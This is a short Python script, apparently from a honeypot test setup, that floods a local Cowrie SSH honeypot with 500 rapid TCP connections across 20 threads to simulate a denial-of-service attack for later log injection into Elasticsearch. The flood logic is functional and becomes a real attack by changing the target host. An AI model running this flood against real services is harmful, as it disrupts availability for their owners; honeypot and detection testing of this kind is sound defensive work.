#!/usr/bin/env python3
"""
Simulated DoS attack on Cowrie honeypot
Attacker IP : 2.57.121.25
Method      : Rapid SSH connection flood (500 attempts)
"""

import socket
import time
import threading

TARGET_HOST  = "localhost"
TARGET_PORT  = 2222
ATTACKER_IP  = "106.75.8.160"
NUM_THREADS  = 20
CONNS_EACH   = 25   # 20 x 25 = 500 connexions

success = 0
failed  = 0
lock    = threading.Lock()

def flood():
    global success, failed
    for _ in range(CONNS_EACH):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((TARGET_HOST, TARGET_PORT))
            s.close()
            with lock:
                success += 1
        except Exception:
            with lock:
                failed += 1

print(f"[*] Simulated DoS attacker : {ATTACKER_IP}")
print(f"[*] Target                 : {TARGET_HOST}:{TARGET_PORT}")
print(f"[*] Threads                : {NUM_THREADS}")
print(f"[*] Total connections      : {NUM_THREADS * CONNS_EACH}\n")

start = time.time()
threads = [threading.Thread(target=flood) for _ in range(NUM_THREADS)]
for t in threads: t.start()
for t in threads: t.join()
duration = round(time.time() - start, 1)

print(f"[+] Done in {duration}s")
print(f"[+] Connected : {success}  Failed : {failed}")
print(f"[+] Rate      : {round((success+failed)/max(duration, 0.1))} conn/sec")
print(f"\n[*] Inject now into Elasticsearch with: python3 test_dos_inject.py")
